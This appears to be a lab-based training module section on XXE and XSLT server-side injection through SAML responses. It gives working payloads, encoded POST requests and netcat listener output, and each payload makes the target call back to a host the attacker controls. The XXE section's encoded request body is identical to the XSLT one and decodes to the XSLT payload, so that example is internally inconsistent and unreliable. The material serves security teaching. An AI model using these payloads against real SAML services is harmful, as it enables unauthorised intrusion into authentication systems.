# Additional SAML Vulnerabilities

Since SAML uses an XML data format for data representation, flawed SAML implementations may be vulnerable to attacks on XML-based data. These are XML eXternal Entity Injection (XXE) and XSLT Server-side Injection.

## XXE Injection

If a SAML service provider relies on a misconfigured XML parser that loads external entities, it may be vulnerable to XXE injection. We can try injecting an XXE payload into the SAML response to test for this vulnerability. For instance, we can try to get a simple connection to a system under our control to confirm the vulnerability:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
```
To inject the payload, we need to obtain the XML representation of the SAML response, just like we did in the previous sections. We can then inject the payload at the beginning of the SAML response, resulting in the following structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://172.17.0.1:8000"> %xxe; ]>
<samlp:Response>
	[...]
</samlp:Response>
```
After Base64- and URL-encoding the XML data, we can send the manipulated SAML response:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 6205
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjx4c2w6c3R5bGVzaGVldCB2ZXJzaW9uPSIxLjAiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4NCjx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPg0KPHhzbDpjb3B5LW9mIHNlbGVjdD0iZG9jdW1lbnQoJ2h0dHA6Ly8xNzIuMTcuMC4xOjgwMDAvJykiLz4NCjwveHNsOnRlbXBsYXRlPg0KPC94c2w6c3R5bGVzaGVldD4%3d&RelayState=%2Facs.php
```
If the service provider is vulnerable to XXE, we should receive a connection at the specified system:

```bash
kabaneridev@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52206
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```
Since the vulnerability typically does not display the resulting data to us, we are dealing with a blind vulnerability, which makes successful exploitation significantly more complex. For more details on XXE, check out the Web Attacks module.

## XSLT Server-side Injection

Similarly to XXE, a misconfigured XML parser might also be vulnerable to XSLT server-side injection, depending on how the XML parser handles the SAML response data. Like before, we will try to inject a payload, resulting in a connection to a server under our control. We can achieve this using an XSLT payload like the following:

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('http://172.17.0.1:8000/')"/>
</xsl:template>
</xsl:stylesheet>
```
After Base64- and URL-encoding the payload, we can send the manipulated SAML response:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 361
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjx4c2w6c3R5bGVzaGVldCB2ZXJzaW9uPSIxLjAiIHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIj4NCjx4c2w6dGVtcGxhdGUgbWF0Y2g9Ii8iPg0KPHhzbDpjb3B5LW9mIHNlbGVjdD0iZG9jdW1lbnQoJ2h0dHA6Ly8xNzIuMTcuMC4xOjgwMDAvJykiLz4NCjwveHNsOnRlbXBsYXRlPg0KPC94c2w6c3R5bGVzaGVldD4%3d&RelayState=%2Facs.php
```
Just like before, we should receive a connection if the service provider is vulnerable to XSLT server-side injection:

```bash
kabaneridev@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57128
GET / HTTP/1.1
Host: 172.17.0.1:8000
Connection: close
```
Note that the service provider might be vulnerable, even though our injected payload does not contain a valid SAML response, and therefore, the service provider rejects our request and denies us access:

`POST request to academy.htb for /acs.php with SAMLResponse. Response is HTTP 302 Found, redirecting to /index.php with message "Invalid SAML Response. Not Authenticated."`

If injecting only the XSLT payload does not work, we should also attempt to inject the payload into the `ds:Transform` node of a valid SAML response to investigate whether the XSLT payload is triggered in the process of parsing the SAML data only if the SAML response contains valid authentication information.

Check out the Server-side Attacks module for more details on XSLT Server-side Injection.
